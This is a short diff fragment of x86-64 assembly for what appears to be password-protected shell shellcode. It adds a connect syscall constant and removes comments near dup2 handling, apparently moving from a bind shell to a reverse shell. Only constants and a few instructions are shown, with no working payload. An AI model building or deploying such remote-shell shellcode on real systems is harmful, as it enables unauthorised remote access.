@@ -13,6 +13,7 @@ SOCK_STREAM equ 0x1
 SYS_DUP2    equ 0x21
 SYS_EXECVE  equ 0x3b
 SYS_SOCKET  equ 0x29
+SYS_CONNECT equ 0x2a
 
 _init_socket:
     ; sock = socket(AF_INET, SOCK_STREAM, 0)
@@ -71,8 +72,6 @@ _read_pw:
     pop rdx
     xor rax,rax
     syscall
-    ; duplicate sockets
-    ; dup2 (new, old)
 
 _auth:
     cmp dword[rsi], PASSWORD
